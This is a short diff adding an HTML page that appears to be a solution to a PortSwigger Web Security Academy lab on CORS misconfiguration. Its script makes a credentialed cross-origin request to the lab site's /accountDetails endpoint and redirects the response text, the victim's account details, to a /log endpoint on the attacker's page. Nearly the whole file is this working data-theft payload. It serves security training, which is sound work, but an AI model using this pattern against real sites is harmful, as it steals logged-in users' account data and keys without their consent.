@@ -1,0 +1,22 @@
+<html>
+<h1>Hello world</h1>
+
+<body>
+    <script>
+        var req = new XMLHttpRequest();
+        var url = 'https://0a2c00920477e5b9885af18c004f0049.web-security-academy.net/accountDetails'
+        //retrieve data
+        req.onload = reqListener;
+
+        //send data
+        req.open('get', url, true);
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+            location = '/log?key=' + this.responseText;
+        };
+    </script>
+</body>
+
+</html>
